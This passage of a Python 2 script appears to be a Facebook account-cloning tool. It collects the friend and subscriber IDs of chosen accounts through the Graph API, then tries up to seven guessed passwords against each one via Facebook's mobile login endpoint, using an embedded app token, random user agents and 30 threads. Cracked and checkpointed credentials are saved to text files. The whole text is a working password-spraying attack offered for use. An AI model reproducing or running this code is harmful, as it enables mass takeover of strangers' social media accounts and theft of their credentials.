        pass5 = raw_input('\x1b[1;93m[+] Password [5] :\x1b[1;92m ')
        pass6 = raw_input('\x1b[1;93m[+] Password [6] :\x1b[1;92m ')
        pass7 = raw_input('\x1b[1;93m[+] Password [7] :\x1b[1;92m ')
        print ''
        idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;92m[+] Input id [2] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;92m[+] Input id [3] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print ' \t  [\x1b[1;97m\x1b[1;41m  Put 7 passwords And 3 idzz Link  \x1b[0m\x1b[1;93m]'
        print ''
        print ''
        pass1 = raw_input('\x1b[1;93m[+] Password [1] :\x1b[1;92m ')
        pass2 = raw_input('\x1b[1;93m[+] Password [2] :\x1b[1;92m ')
        pass3 = raw_input('\x1b[1;93m[+] Password [3] :\x1b[1;92m ')
        pass4 = raw_input('\x1b[1;93m[+] Password [4] :\x1b[1;92m ')
        pass5 = raw_input('\x1b[1;93m[+] Password [5] :\x1b[1;92m ')
        pass6 = raw_input('\x1b[1;93m[+] Password [6] :\x1b[1;92m ')
        pass7 = raw_input('\x1b[1;93m[+] Password [7] :\x1b[1;92m ')
        print ''
        idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;92m[+] Input id [2] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;92m[+] Input id [3] : \x1b[1;93m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option\x1b[0;97m'
        print ''
        choice_select()
    print ' \x1b[1;93mTotal IDs :\x1b[1;92m ' + str(len(id))
    print ' \x1b[1;93mThe process has been Started'
    print ' \x1b[1;93mPlzz wait to crack idzz'
    print ' \x1b[1;93mPress ctrl + z to stop'
    print 54 * '_'
    print ''
    print '[\x1b[1;97m\x1b[1;41m For Speedup Cloning Turn On Airplane mode 5 Second \x1b[0m\x1b[1;93m]'
    print 54 * '\x1b[1;93m_'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Syedok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('Syedcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('Syedok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Syedcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Syedok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Syedcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('Syedok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Syedcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('Syedok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Syedcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('Syedok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Syedcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[LEGEND-SYED-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('Syedok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[LEGEND-SYED-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Syedcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print ''
    print 54 * '\x1b[1;92m_'
    print ''
    print ' \x1b[1;92mThe process has been completed'
    print ' \x1b[1;92mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: Syedcp.txt'
    print 54 * '_'
    print ''
    print ''
    raw_input(' \x1b[1;93mPress enter to back ')
    main()


if __name__ == '__main__':
    tool()
